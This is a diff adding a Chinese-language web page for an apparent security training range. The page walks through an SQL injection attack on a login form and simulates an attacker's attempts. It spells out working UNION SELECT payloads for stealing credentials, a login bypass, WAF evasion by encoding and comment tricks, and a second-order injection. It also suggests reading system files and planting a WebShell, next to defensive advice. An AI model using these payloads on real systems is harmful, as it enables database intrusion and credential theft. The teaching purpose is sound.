+                                    <li>设计需要内网横向移动的多层网络环境</li>
+                                    <li>添加权限提升挑战</li>
+                                </ul>
+                                
+                                <h4>3. 防御机制增强</h4>
+                                <p>当前靶场的防御机制可以进一步增强：</p>
+                                <ul>
+                                    <li>实现更真实的WAF规则集</li>
+                                    <li>添加入侵检测系统(IDS)记录攻击行为</li>
+                                    <li>实现蜜罐技术，诱导攻击者进入错误路径</li>
+                                    <li>添加日志审计功能，记录所有攻击尝试</li>
+                                </ul>
+                                
+                                <h4>4. 学习反馈机制</h4>
+                                <p>为提高靶场的教学价值，建议添加：</p>
+                                <ul>
+                                    <li>每个攻击步骤的详细解释和学习资源</li>
+                                    <li>攻击失败时的提示系统</li>
+                                    <li>不同解决方案的比较和分析</li>
+                                    <li>实时评分和进度跟踪系统</li>
+                                </ul>
+                                
+                                <h4>5. 技术实现建议</h4>
+                                <p>靶场技术实现可以考虑以下改进：</p>
+                                <ul>
+                                    <li>使用Docker容器化部署，便于环境重置</li>
+                                    <li>实现自动评分和验证系统</li>
+                                    <li>提供API接口，支持与其他安全工具集成</li>
+                                    <li>添加真实世界漏洞的模拟环境</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="nav-buttons">
+                <button class="prev-btn" id="step6-prev">上一步</button>
+                <button class="finish-btn" id="finish-btn">完成</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>1. 攻击溯源优化</h2>
+            <div class="analysis-container">
+                <div class="analysis-item">
+                    <div class="analysis-label">失败分析</div>
+                    <div class="analysis-content">
+                        <p><strong>自动分析攻击失败原因：</strong>SQL注入攻击成功的主要原因是应用程序未对用户输入进行有效过滤和参数化查询。具体表现为：</p>
+                        <ul>
+                            <li>未对单引号等特殊字符进行转义</li>
+                            <li>使用了拼接SQL语句而非预处理语句</li>
+                            <li>数据库错误信息直接返回给前端，泄露了数据库结构</li>
+                            <li>数据库账号权限过高，可以查询所有表</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">策略调整</div>
+                    <div class="analysis-content">
+                        <p><strong>根据环境特点调整攻击策略：</strong>针对此类SQL注入漏洞，可采取以下策略：</p>
+                        <ul>
+                            <li>使用SQLmap等工具自动化检测和利用SQL注入点</li>
+                            <li>构造特定的UNION查询语句获取敏感数据</li>
+                            <li>利用数据库特有函数（如MySQL的load_file()）读取系统文件</li>
+                            <li>尝试写入WebShell进一步扩大攻击面</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">路径补充</div>
+                    <div class="analysis-content">
+                        <p><strong>发现并补充遗漏的攻击步骤：</strong>在SQL注入攻击过程中，还可以：</p>
+                        <ul>
+                            <li>利用information_schema获取完整的数据库结构</li>
+                            <li>检查数据库用户权限，尝试提升至数据库管理员</li>
+                            <li>获取其他业务表数据，如用户个人信息、交易记录等</li>
+                            <li>检查是否可以利用SQL注入执行系统命令</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">成功率提升</div>
+                    <div class="analysis-content">
+                        <p><strong>优化攻击顺序和方法：</strong>为提高攻击成功率，建议：</p>
+                        <ul>
+                            <li>先进行指纹识别，确定数据库类型和版本</li>
+                            <li>使用参数化查询绕过简单的过滤措施</li>
+                            <li>构建逐步测试的注入语句，避免一次性复杂查询</li>
+                            <li>利用条件时间延迟等盲注技术应对无错误回显的情况</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="attack-path">
+                <h3>完整攻击路径</h3>
+                <div class="attack-step">
+                    <span class="step-number">1</span>
+                    <span>发现注入点：在login.php页面的username参数中输入单引号，观察到数据库错误信息</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">2</span>
+                    <span>确认注入类型：通过测试确认为联合查询(UNION)型注入，可以直接获取数据</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">3</span>
+                    <span>获取数据库信息：使用 ' UNION SELECT version(),database(),user() -- 获取数据库版本、名称和当前用户</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">4</span>
+                    <span>枚举数据库表：使用 ' UNION SELECT table_name,1,1 FROM information_schema.tables WHERE table_schema=database() -- 获取当前数据库的表名</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">5</span>
+                    <span>获取表结构：使用 ' UNION SELECT column_name,1,1 FROM information_schema.columns WHERE table_name='users' -- 获取users表的列名</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">6</span>
+                    <span>提取敏感数据：使用 ' UNION SELECT username,password,email FROM users -- 获取用户名、密码和邮箱</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">7</span>
+                    <span>利用获取的凭据：使用管理员账号密码登录系统，获取更高权限</span>
+                </div>
+            </div>
+
+            <div class="success-strategy">
+                <h3>优化攻击顺序和方法</h3>
+                <p>针对此类SQL注入漏洞，最佳攻击路径是先确认注入点和类型，然后逐步获取数据库信息、表结构和敏感数据。使用联合查询时，需要确定正确的列数，可以通过ORDER BY语句逐步测试。对于无回显的情况，可以使用布尔盲注或时间盲注技术。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>2. 真实性增强</h2>
+            <div class="analysis-container">
+                <div class="analysis-item">
+                    <div class="analysis-label">思考过程</div>
+                    <div class="analysis-content">
+                        <p><strong>添加攻击者的决策思路：</strong>在发现SQL注入点后，攻击者通常会：</p>
+                        <ol>
+                            <li>评估注入点的类型（错误型、联合查询型、布尔型、时间型）</li>
+                            <li>根据应用响应选择最合适的注入技术</li>
+                            <li>确定目标数据（用户凭据、个人信息、业务数据）</li>
+                            <li>考虑是否需要进一步提权或获取服务器访问权限</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">试错模拟</div>
+                    <div class="analysis-content">
+                        <p><strong>模拟真实的尝试和调整过程：</strong></p>
+                        <p>初始尝试：<code>username=' OR '1'='1</code> - 成功绕过登录</p>
+                        <p>确定列数：<code>username=' ORDER BY 1-- </code> (成功) → <code>username=' ORDER BY 2-- </code> (成功) → <code>username=' ORDER BY 3-- </code> (成功) → <code>username=' ORDER BY 4-- </code> (失败) → 确认有3列</p>
+                        <p>获取数据库版本：<code>username=' UNION SELECT 1,2,version()-- </code> → 返回MySQL 5.7.34</p>
+                        <p>获取当前数据库：<code>username=' UNION SELECT 1,2,database()-- </code> → 返回webapp_db</p>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">时间控制</div>
+                    <div class="analysis-content">
+                        <p><strong>增加合理的攻击时间间隔：</strong>一个真实的SQL注入攻击过程通常需要：</p>
+                        <ul>
+                            <li>初步发现注入点：5-10分钟</li>
+                            <li>确认注入类型和数据库信息：10-15分钟</li>
+                            <li>枚举数据库结构：15-20分钟</li>
+                            <li>提取敏感数据：10-15分钟</li>
+                            <li>利用获取的信息进行进一步攻击：20-30分钟</li>
+                        </ul>
+                        <p>总计：约1-1.5小时完成基本的SQL注入攻击流程</p>
+                    </div>
+                </div>
+
+                <div class="analysis-item">
+                    <div class="analysis-label">行为拟人</div>
+                    <div class="analysis-content">
+                        <p><strong>模拟人类攻击者的行为特征：</strong>真实攻击者会：</p>
+                        <ul>
+                            <li>在确认注入点后，先测试简单的注入语句，再逐步构建复杂查询</li>
+                            <li>遇到错误时会调整查询语法，尝试不同的注释符号（--、#、;--等）</li>
+                            <li>根据数据库类型使用特定函数（MySQL的concat()、SQLServer的+等）</li>
+                            <li>在获取敏感数据后，会尝试进一步利用，如获取系统权限</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="protection-tip">
+                <h3>针对性的安全防护措施</h3>
+                <p>为防止SQL注入攻击，应实施以下防护措施：</p>
+                <ul>
+                    <li>使用参数化查询或预处理语句处理所有用户输入</li>
+                    <li>实施最小权限原则，限制数据库用户权限</li>
+                    <li>过滤和转义特殊字符，特别是单引号、双引号和反斜杠</li>
+                    <li>隐藏详细的错误信息，避免泄露数据库结构</li>
+                    <li>使用WAF（Web应用防火墙）检测和阻止SQL注入尝试</li>
+                    <li>定期进行安全审计和渗透测试，及时修复漏洞</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section teaching-section">
+            <h2>3. 教学指导生成</h2>
+            <div class="teaching-item">
+                <h3>原理解释</h3>
+                <p>SQL注入是一种常见的Web应用程序漏洞，攻击者通过在用户输入中插入恶意SQL代码，使应用程序执行非预期的数据库操作。当应用程序直接将用户输入拼接到SQL查询中而不进行适当的过滤或参数化处理时，就会产生此漏洞。</p>
+                <p>在本例中，login.php页面的username参数存在注入点，允许攻击者通过构造特殊输入来修改原始SQL查询的结构和逻辑，从而执行未授权的数据库操作。</p>
+            </div>
+
+            <div class="teaching-item">
+                <h3>防护建议</h3>
+                <p>针对性的安全防护措施包括：</p>
+                <ul>
+                    <li><strong>参数化查询：</strong>使用预处理语句和参数绑定，将SQL语句结构与数据分离</li>
+                    <li><strong>输入验证：</strong>实施严格的输入验证，过滤特殊字符和SQL关键字</li>
+                    <li><strong>最小权限：</strong>应用程序使用的数据库账号应只具备必要的最小权限</li>
+                    <li><strong>错误处理：</strong>自定义错误页面，避免向用户显示详细的数据库错误信息</li>
+                    <li><strong>WAF部署：</strong>使用Web应用防火墙检测和阻止SQL注入攻击</li>
+                </ul>
+            </div>
+
+            <div class="teaching-item">
+                <h3>知识扩展</h3>
+                <p>SQL注入攻击类型多样，主要包括：</p>
+                <ul>
+                    <li><strong>错误型注入：</strong>利用数据库错误信息获取数据库结构</li>
+                    <li><strong>联合查询注入：</strong>使用UNION SELECT语句直接从数据库获取数据</li>
+                    <li><strong>布尔型盲注：</strong>通过观察应用程序的真/假响应推断数据</li>
+                    <li><strong>时间型盲注：</strong>通过数据库查询执行时间的差异推断数据</li>
+                    <li><strong>堆叠查询：</strong>使用分号分隔多条SQL语句，执行额外的操作</li>
+                </ul>
+                <p>防御SQL注入是Web应用安全的基础，也是OWASP Top 10安全风险中的重要组成部分。</p>
+            </div>
+
+            <div class="teaching-item">
+                <h3>学习指导</h3>
+                <p>根据学员水平定制学习建议：</p>
+                <ul>
+                    <li><strong>初学者：</strong>理解SQL注入的基本原理，学习识别常见的注入点，掌握基本的防护措施</li>
+                    <li><strong>中级学员：</strong>深入学习不同类型的SQL注入技术，了解各种数据库的特性和差异，掌握手动和自动化工具的使用</li>
+                    <li><strong>高级学员：</strong>研究复杂环境下的SQL注入绕过技术，学习二阶注入、ORM注入等高级技术，能够开发自定义工具检测和利用SQL注入漏洞</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // 获取所有步骤表单和导航按钮
+            const stepForms = document.querySelectorAll('.form-section');
+            const stepCircles = document.querySelectorAll('.step-circle');
+            const stepTitles = document.querySelectorAll('.step-title');
+            const stepLines = document.querySelectorAll('.step-line');
+            const nextButtons = document.querySelectorAll('.next-btn');
+            const prevButtons = document.querySelectorAll('.prev-btn');
+            const finishButton = document.getElementById('finish-btn');
+            const analyzeButton = document.getElementById('analyzeButton');
+            const attackReport = document.getElementById('attackReport');
+            
+            // 当前步骤
+            let currentStep = 1;
+            
+            // 更新步骤状态
+            function updateStepStatus() {
+                // 更新步骤圆圈和标题
+                stepCircles.forEach((circle, index) => {
+                    const stepNum = index + 1;
+                    circle.classList.remove('active', 'completed');
+                    if (stepNum < currentStep) {
+                        circle.classList.add('completed');
+                    } else if (stepNum === currentStep) {
+                        circle.classList.add('active');
+                    }
+                });
+                
+                // 更新步骤标题
+                stepTitles.forEach((title, index) => {
+                    const stepNum = index + 1;
+                    title.classList.remove('active');
+                    if (stepNum === currentStep) {
+                        title.classList.add('active');
+                    }
+                });
+                
+                // 更新连接线
+                stepLines.forEach((line, index) => {
+                    line.classList.remove('completed');
+                    if (index < currentStep - 1) {
+                        line.classList.add('completed');
+                    }
+                });
+                
+                // 显示当前步骤表单，隐藏其他表单
+                stepForms.forEach((form, index) => {
+                    const stepNum = index + 1;
+                    form.classList.remove('active');
+                    if (stepNum === currentStep) {
+                        form.classList.add('active');
+                    }
+                });
+            }
+            
+            // 下一步按钮点击事件
+            nextButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    if (currentStep < stepForms.length) {
+                        currentStep++;
+                        updateStepStatus();
+                    }
+                });
+            });
+            
+            // 上一步按钮点击事件
+            prevButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    if (currentStep > 1) {
+                        currentStep--;
+                        updateStepStatus();
+                    }
+                });
+            });
+            
+            // 完成按钮点击事件
+            if (finishButton) {
+                finishButton.addEventListener('click', function() {
+                    alert('攻击分析和报告生成已完成！');
+                    // 可以添加其他完成后的逻辑
+                });
+            }
+            
+            // 分析按钮点击事件
+            analyzeButton.addEventListener('click', function() {
+                // 模拟分析过程
+                analyzeButton.textContent = '分析中...';
+                setTimeout(function() {
+                    analyzeButton.textContent = '生成处理过程';
+                    document.getElementById('step2-next').disabled = false;
+                    alert('已对攻击报告进行智能分析和标注！');
+                }, 1500);
+            });
+            
+            // 攻击路径编辑功能
+            const editButtons = document.querySelectorAll('.edit-btn');
+            const saveButtons = document.querySelectorAll('.save-btn');
+            const deleteButtons = document.querySelectorAll('.delete-btn');
+            const addStepButton = document.getElementById('add-step-btn');
+            const attackStepsContainer = document.querySelector('.attack-steps');
+            
+            // 编辑按钮点击事件
+            editButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const attackStep = this.closest('.attack-step');
+                    const titleInput = attackStep.querySelector('.step-title-input');
+                    const contentInput = attackStep.querySelector('.step-content-input');
+                    const saveBtn = attackStep.querySelector('.save-btn');
+                    
+                    // 启用编辑
+                    titleInput.disabled = false;
+                    contentInput.disabled = false;
+                    this.style.display = 'none';
+                    saveBtn.style.display = 'inline-block';
+                });
+            });
+            
+            // 保存按钮点击事件
+            saveButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const attackStep = this.closest('.attack-step');
+                    const titleInput = attackStep.querySelector('.step-title-input');
+                    const contentInput = attackStep.querySelector('.step-content-input');
+                    const editBtn = attackStep.querySelector('.edit-btn');
+                    
+                    // 禁用编辑
+                    titleInput.disabled = true;
+                    contentInput.disabled = true;
+                    this.style.display = 'none';
+                    editBtn.style.display = 'inline-block';
+                });
+            });
+            
+            // 删除按钮点击事件
+            deleteButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    if (confirm('确定要删除这个攻击步骤吗？')) {
+                        const attackStep = this.closest('.attack-step');
+                        attackStep.remove();
+                        // 更新步骤编号
+                        updateStepNumbers();
+                    }
+                });
+            });
+            
+            // 添加攻击步骤按钮点击事件
+            if (addStepButton) {
+                addStepButton.addEventListener('click', function() {
+                    const stepCount = document.querySelectorAll('.attack-step').length + 1;
+                    const newStep = document.createElement('div');
+                    newStep.className = 'attack-step';
+                    newStep.innerHTML = `
+                        <div class="step-header">
+                            <span class="step-number">${stepCount}</span>
+                            <input type="text" class="step-title-input" value="新攻击步骤">
+                            <div class="step-actions">
+                                <button class="edit-btn">编辑</button>
+                                <button class="save-btn" style="display:none;">保存</button>
+                                <button class="delete-btn">删除</button>
+                            </div>
+                        </div>
+                        <div class="step-content">
+                            <textarea class="step-content-input" disabled>请输入攻击步骤详情...</textarea>
+                        </div>
+                    `;
+                    attackStepsContainer.appendChild(newStep);
+                    
+                    // 为新添加的按钮绑定事件
+                    const newEditBtn = newStep.querySelector('.edit-btn');
+                    const newSaveBtn = newStep.querySelector('.save-btn');
+                    const newDeleteBtn = newStep.querySelector('.delete-btn');
+                    
+                    newEditBtn.addEventListener('click', function() {
+                        const attackStep = this.closest('.attack-step');
+                        const titleInput = attackStep.querySelector('.step-title-input');
+                        const contentInput = attackStep.querySelector('.step-content-input');
+                        
+                        titleInput.disabled = false;
+                        contentInput.disabled = false;
+                        this.style.display = 'none';
+                        newSaveBtn.style.display = 'inline-block';
+                    });
+                    
+                    newSaveBtn.addEventListener('click', function() {
+                        const attackStep = this.closest('.attack-step');
+                        const titleInput = attackStep.querySelector('.step-title-input');
+                        const contentInput = attackStep.querySelector('.step-content-input');
+                        
+                        titleInput.disabled = true;
+                        contentInput.disabled = true;
+                        this.style.display = 'none';
+                        newEditBtn.style.display = 'inline-block';
+                    });
+                    
+                    newDeleteBtn.addEventListener('click', function() {
+                        if (confirm('确定要删除这个攻击步骤吗？')) {
+                            const attackStep = this.closest('.attack-step');
+                            attackStep.remove();
+                            updateStepNumbers();
+                        }
+                    });
+                });
+            }
+            
+            // 更新步骤编号
+            function updateStepNumbers() {
+                const steps = document.querySelectorAll('.attack-step');
+                steps.forEach((step, index) => {
+                    const stepNumber = step.querySelector('.step-number');
+                    stepNumber.textContent = index + 1;
+                });
+            }
+            
+            // 应用AI建议按钮点击事件
+            const applySuggestionButtons = document.querySelectorAll('.apply-suggestion-btn');
+            applySuggestionButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const suggestionItem = this.closest('.suggestion-item');
+                    const suggestionTitle = suggestionItem.querySelector('h4').textContent;
+                    const suggestionContent = suggestionItem.querySelector('p').textContent;
+                    
+                    // 添加新的攻击步骤
+                    const stepCount = document.querySelectorAll('.attack-step').length + 1;
+                    const newStep = document.createElement('div');
+                    newStep.className = 'attack-step';
+                    newStep.innerHTML = `
+                        <div class="step-header">
+                            <span class="step-number">${stepCount}</span>
+                            <input type="text" class="step-title-input" value="${suggestionTitle}">
+                            <div class="step-actions">
+                                <button class="edit-btn">编辑</button>
+                                <button class="save-btn" style="display:none;">保存</button>
+                                <button class="delete-btn">删除</button>
+                            </div>
+                        </div>
+                        <div class="step-content">
+                            <textarea class="step-content-input" disabled>${suggestionContent}</textarea>
+                        </div>
+                    `;
+                    attackStepsContainer.appendChild(newStep);
+                    
+                    // 为新添加的按钮绑定事件
+                    const newEditBtn = newStep.querySelector('.edit-btn');
+                    const newSaveBtn = newStep.querySelector('.save-btn');
+                    const newDeleteBtn = newStep.querySelector('.delete-btn');
+                    
+                    newEditBtn.addEventListener('click', function() {
+                        const attackStep = this.closest('.attack-step');
+                        const titleInput = attackStep.querySelector('.step-title-input');
+                        const contentInput = attackStep.querySelector('.step-content-input');
+                        
+                        titleInput.disabled = false;
+                        contentInput.disabled = false;
+                        this.style.display = 'none';
+                        newSaveBtn.style.display = 'inline-block';
+                    });
+                    
+                    newSaveBtn.addEventListener('click', function() {
+                        const attackStep = this.closest('.attack-step');
+                        const titleInput = attackStep.querySelector('.step-title-input');
+                        const contentInput = attackStep.querySelector('.step-content-input');
+                        
+                        titleInput.disabled = true;
+                        contentInput.disabled = true;
+                        this.style.display = 'none';
+                        newEditBtn.style.display = 'inline-block';
+                    });
+                    
+                    newDeleteBtn.addEventListener('click', function() {
+                        if (confirm('确定要删除这个攻击步骤吗？')) {
+                            const attackStep = this.closest('.attack-step');
+                            attackStep.remove();
+                            updateStepNumbers();
+                        }
+                    });
+                    
+                    alert(`已应用建议: ${suggestionTitle}`);
+                });
+            });
+            
+            // 标签页切换功能
+            const tabs = document.querySelectorAll('.tab');
+            const tabPanes = document.querySelectorAll('.tab-pane');
+            
+            tabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    
+                    // 移除所有标签和面板的活动状态
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tabPanes.forEach(p => p.classList.remove('active'));
+                    
+                    // 设置当前标签和面板为活动状态
+                    this.classList.add('active');
+                    document.getElementById(tabId).classList.add('active');
+                });
+            });
+        });
+    </script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // 步骤导航功能
+        const steps = document.querySelectorAll('.step');
+        const stepContents = document.querySelectorAll('.step-content-container');
+        const nextButtons = document.querySelectorAll('.next-btn');
+        const prevButtons = document.querySelectorAll('.prev-btn');
+        
+        // 初始化显示第一步
+        if (steps.length > 0 && stepContents.length > 0) {
+            steps[0].classList.add('active');
+            stepContents[0].style.display = 'block';
+        }
+        
+        // 下一步按钮点击事件
+        nextButtons.forEach((button, index) => {
+            button.addEventListener('click', function() {
+                if (index < steps.length - 1) {
+                    // 隐藏当前步骤
+                    steps[index].classList.remove('active');
+                    stepContents[index].style.display = 'none';
+                    
+                    // 显示下一步骤
+                    steps[index + 1].classList.add('active');
+                    stepContents[index + 1].style.display = 'block';
+                    
+                    // 如果是第3步到第4步，模拟AI攻击失败
+                    if (index === 2) {
+                        simulateAttackFailure();
+                    }
+                    
+                    // 如果是第4步到第5步，模拟攻击成功
+                    if (index === 3) {
+                        simulateAttackSuccess();
+                    }
+                }
+            });
+        });
+        
+        // 上一步按钮点击事件
+        prevButtons.forEach((button, index) => {
+            button.addEventListener('click', function() {
+                if (index > 0) {
+                    // 隐藏当前步骤
+                    steps[index].classList.remove('active');
+                    stepContents[index].style.display = 'none';
+                    
+                    // 显示上一步骤
+                    steps[index - 1].classList.add('active');
+                    stepContents[index - 1].style.display = 'block';
+                }
+            });
+        });
+        
+        // 攻击路径编辑功能
+        const attackSteps = document.querySelectorAll('.attack-step');
+        
+        attackSteps.forEach(step => {
+            const editBtn = step.querySelector('.edit-btn');
+            const saveBtn = step.querySelector('.save-btn');
+            const deleteBtn = step.querySelector('.delete-btn');
+            const titleInput = step.querySelector('.step-title-input');
+            const contentInput = step.querySelector('.step-content-input');
+            
+            // 编辑按钮点击事件
+            if (editBtn) {
+                editBtn.addEventListener('click', function() {
+                    // 启用输入框
+                    if (titleInput) titleInput.disabled = false;
+                    if (contentInput) contentInput.disabled = false;
+                    
+                    // 切换按钮显示
+                    editBtn.style.display = 'none';
+                    if (saveBtn) saveBtn.style.display = 'inline-block';
+                });
+            }
+            
+            // 保存按钮点击事件
+            if (saveBtn) {
+                saveBtn.addEventListener('click', function() {
+                    // 禁用输入框
+                    if (titleInput) titleInput.disabled = true;
+                    if (contentInput) contentInput.disabled = true;
+                    
+                    // 切换按钮显示
+                    saveBtn.style.display = 'none';
+                    if (editBtn) editBtn.style.display = 'inline-block';
+                });
+            }
+            
+            // 删除按钮点击事件
+            if (deleteBtn) {
+                deleteBtn.addEventListener('click', function() {
+                    if (confirm('确定要删除这个攻击步骤吗？')) {
+                        step.remove();
+                    }
+                });
+            }
+        });
+        
+        // 添加攻击步骤按钮点击事件
+        const addStepBtn = document.getElementById('add-step-btn');
+        const attackPathContainer = document.getElementById('attack-path-container');
+        
+        if (addStepBtn && attackPathContainer) {
+            addStepBtn.addEventListener('click', function() {
+                const stepCount = attackPathContainer.querySelectorAll('.attack-step').length + 1;
+                
+                const newStep = document.createElement('div');
+                newStep.className = 'attack-step';
+                newStep.innerHTML = `
+                    <div class="step-header">
+                        <div class="step-number">${stepCount}</div>
+                        <input type="text" class="step-title-input" value="新攻击步骤" disabled>
+                        <div class="step-actions">
+                            <button class="edit-btn">编辑</button>
+                            <button class="save-btn">保存</button>
+                            <button class="delete-btn">删除</button>
+                        </div>
+                    </div>
+                    <div class="step-content">
+                        <textarea class="step-content-input" disabled>在这里描述攻击步骤的详细内容...</textarea>
+                    </div>
+                `;
+                
+                attackPathContainer.appendChild(newStep);
+                
+                // 为新添加的步骤绑定事件
+                const editBtn = newStep.querySelector('.edit-btn');
+                const saveBtn = newStep.querySelector('.save-btn');
+                const deleteBtn = newStep.querySelector('.delete-btn');
+                const titleInput = newStep.querySelector('.step-title-input');
+                const contentInput = newStep.querySelector('.step-content-input');
+                
+                editBtn.addEventListener('click', function() {
+                    titleInput.disabled = false;
+                    contentInput.disabled = false;
+                    editBtn.style.display = 'none';
+                    saveBtn.style.display = 'inline-block';
+                });
+                
+                saveBtn.addEventListener('click', function() {
+                    titleInput.disabled = true;
+                    contentInput.disabled = true;
+                    saveBtn.style.display = 'none';
+                    editBtn.style.display = 'inline-block';
+                });
+                
+                deleteBtn.addEventListener('click', function() {
+                    if (confirm('确定要删除这个攻击步骤吗？')) {
+                        newStep.remove();
+                    }
+                });
+            });
+        }
+        
+        // AI建议应用按钮点击事件
+        const applyWafBtn = document.getElementById('apply-waf-btn');
+        const applySecondOrderBtn = document.getElementById('apply-second-order-btn');
+        
+        if (applyWafBtn) {
+            applyWafBtn.addEventListener('click', function() {
+                const newStep = document.createElement('div');
+                newStep.className = 'attack-step';
+                const stepCount = attackPathContainer.querySelectorAll('.attack-step').length + 1;
+                
+                newStep.innerHTML = `
+                    <div class="step-header">
+                        <div class="step-number">${stepCount}</div>
+                        <input type="text" class="step-title-input" value="WAF绕过技术" disabled>
+                        <div class="step-actions">
+                            <button class="edit-btn">编辑</button>
+                            <button class="save-btn">保存</button>
+                            <button class="delete-btn">删除</button>
+                        </div>
+                    </div>
+                    <div class="step-content">
+                        <textarea class="step-content-input" disabled>使用注释混淆和编码技术绕过WAF检测：
+1. 使用内联注释: /\*\*/UNION/\*\*/SELECT
+2. 使用URL编码: %55%4E%49%4F%4E %53%45%4C%45%43%54
+3. 使用大小写混合: UnIoN SeLeCt
+4. 使用等价函数替换: CONCAT()替代||操作符
+
+测试结果：成功绕过WAF，获取到数据库版本信息</textarea>
+                    </div>
+                `;
+                
+                attackPathContainer.appendChild(newStep);
+                
+                // 为新添加的步骤绑定事件
+                const editBtn = newStep.querySelector('.edit-btn');
+                const saveBtn = newStep.querySelector('.save-btn');
+                const deleteBtn = newStep.querySelector('.delete-btn');
+                const titleInput = newStep.querySelector('.step-title-input');
+                const contentInput = newStep.querySelector('.step-content-input');
+                
+                editBtn.addEventListener('click', function() {
+                    titleInput.disabled = false;
+                    contentInput.disabled = false;
+                    editBtn.style.display = 'none';
+                    saveBtn.style.display = 'inline-block';
+                });
+                
+                saveBtn.addEventListener('click', function() {
+                    titleInput.disabled = true;
+                    contentInput.disabled = true;
+                    saveBtn.style.display = 'none';
+                    editBtn.style.display = 'inline-block';
+                });
+                
+                deleteBtn.addEventListener('click', function() {
+                    if (confirm('确定要删除这个攻击步骤吗？')) {
+                        newStep.remove();
+                    }
+                });
+            });
+        }
+        
+        if (applySecondOrderBtn) {
+            applySecondOrderBtn.addEventListener('click', function() {
+                const newStep = document.createElement('div');
+                newStep.className = 'attack-step';
+                const stepCount = attackPathContainer.querySelectorAll('.attack-step').length + 1;
+                
+                newStep.innerHTML = `
+                    <div class="step-header">
+                        <div class="step-number">${stepCount}</div>
+                        <input type="text" class="step-title-input" value="二阶SQL注入尝试" disabled>
+                        <div class="step-actions">
+                            <button class="edit-btn">编辑</button>
+                            <button class="save-btn">保存</button>
+                            <button class="delete-btn">删除</button>
+                        </div>
+                    </div>
+                    <div class="step-content">
+                        <textarea class="step-content-input" disabled>执行二阶SQL注入攻击：
+1. 在个人资料页面提交恶意数据: admin' OR '1'='1
+2. 等待数据存储到数据库
+3. 访问搜索功能触发存储的恶意代码
+4. 观察到搜索结果返回了所有用户数据
+
+测试结果：成功绕过输入验证，利用存储的恶意代码执行了权限提升</textarea>
+                    </div>
+                `;
+                
+                attackPathContainer.appendChild(newStep);
+                
+                // 为新添加的步骤绑定事件
+                const editBtn = newStep.querySelector('.edit-btn');
+                const saveBtn = newStep.querySelector('.save-btn');
+                const deleteBtn = newStep.querySelector('.delete-btn');
+                const titleInput = newStep.querySelector('.step-title-input');
+                const contentInput = newStep.querySelector('.step-content-input');
+                
+                editBtn.addEventListener('click', function() {
+                    titleInput.disabled = false;
+                    contentInput.disabled = false;
+                    editBtn.style.display = 'none';
+                    saveBtn.style.display = 'inline-block';
+                });
+                
+                saveBtn.addEventListener('click', function() {
+                    titleInput.disabled = true;
+                    contentInput.disabled = true;
+                    saveBtn.style.display = 'none';
+                    editBtn.style.display = 'inline-block';
+                });
+                
+                deleteBtn.addEventListener('click', function() {
+                    if (confirm('确定要删除这个攻击步骤吗？')) {
+                        newStep.remove();
+                    }
+                });
+            });
+        }
+        
+        // 模拟AI攻击失败
+        function simulateAttackFailure() {
+            const attackLog = document.getElementById('attack-log');
+            if (attackLog) {
+                attackLog.innerHTML = '';
+                
+                const logMessages = [
+                    { text: '> 初始化攻击环境...', delay: 500 },
+                    { text: '> 连接到目标系统...', delay: 1000 },
+                    { text: '> 开始信息收集...', delay: 1500 },
+                    { text: '> 发现目标使用MySQL数据库...', delay: 2000 },
+                    { text: '> 尝试SQL注入攻击...', delay: 2500 },
+                    { text: '> 注入payload: admin\'--', delay: 3000 },
+                    { text: '> 错误: 检测到WAF拦截', delay: 3500 },
+                    { text: '> 尝试基本绕过技术...', delay: 4000 },
+                    { text: '> 错误: 绕过失败', delay: 4500 },
+                    { text: '> 尝试其他注入点...', delay: 5000 },
+                    { text: '> 错误: 所有注入点均被保护', delay: 5500 },
+                    { text: '> 攻击失败: 需要更高级的绕过技术', delay: 6000 }
+                ];
+                
+                let totalDelay = 0;
+                logMessages.forEach(message => {
+                    totalDelay += message.delay;
+                    setTimeout(() => {
+                        const logEntry = document.createElement('div');
+                        logEntry.className = 'log-entry';
+                        logEntry.textContent = message.text;
+                        attackLog.appendChild(logEntry);
+                        attackLog.scrollTop = attackLog.scrollHeight;
+                    }, totalDelay);
+                });
+            }
+        }
+        
+        // 模拟攻击成功
+        function simulateAttackSuccess() {
+            const successLog = document.getElementById('success-log');
+            if (successLog) {
+                successLog.innerHTML = '';
+                
+                const logMessages = [
+                    { text: '> 初始化攻击环境...', delay: 500 },
+                    { text: '> 连接到目标系统...', delay: 1000 },
+                    { text: '> 开始信息收集...', delay: 1500 },
+                    { text: '> 发现目标使用MySQL数据库...', delay: 2000 },
+                    { text: '> 应用WAF绕过技术...', delay: 2500 },
+                    { text: '> 使用编码混淆: %55%4E%49%4F%4E %53%45%4C%45%43%54', delay: 3000 },
+                    { text: '> WAF绕过成功!', delay: 3500 },
+                    { text: '> 执行二阶SQL注入...', delay: 4000 },
+                    { text: '> 成功存储恶意代码到数据库', delay: 4500 },
